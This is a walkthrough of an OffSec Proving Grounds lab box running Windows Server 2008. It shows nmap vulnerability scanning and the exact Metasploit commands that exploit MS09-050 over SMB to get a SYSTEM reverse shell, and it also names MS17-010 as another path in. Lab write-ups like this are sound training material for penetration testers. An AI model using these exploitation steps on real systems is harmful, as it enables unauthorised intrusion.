# Internal — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Windows Server 2008

---

## TL;DR

Windows Server 2008 vulnerable to MS09-050 (SMBv2 Negotiation Vulnerability) → Metasploit module → instant SYSTEM shell.

---

## Enumeration

```bash
nmap -sV --script vuln 192.168.195.40
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Microsoft DNS 6.0.6001 |
| 135 | MSRPC | Microsoft Windows RPC |
| 139/445 | SMB | Windows Server 2008 SP1 |
| 3389 | RDP | |
| 5357 | HTTP | Microsoft HTTPAPI 2.0 |

Nmap's vulnerability scripts reveal two critical findings:
- **CVE-2009-3103** (MS09-050) — SMBv2 Negotiation Vulnerability: **VULNERABLE**
- **CVE-2017-0143** (MS17-010) — EternalBlue: **VULNERABLE**

---

## Exploitation — MS09-050 (SMBv2 Negotiation)

The manual Python exploit ([EDB-40280](https://www.exploit-db.com/exploits/40280)) didn't work even after modifying the shellcode. So we go to Metasploit:

```bash
msfconsole
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.195.40
set LHOST <your_ip>
run
```

**SYSTEM shell.** 🎉

---

## Key Takeaways

- **Always run nmap vulnerability scripts** (`--script vuln`) on old Windows systems — they'll often reveal known exploits
- **MS09-050** and **MS17-010** are both present on this box — multiple paths to SYSTEM
- When manual exploits fail, Metasploit modules are often more reliable (they handle edge cases better)
- Windows Server 2008 without patches = multiple trivial SYSTEM-level exploits

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
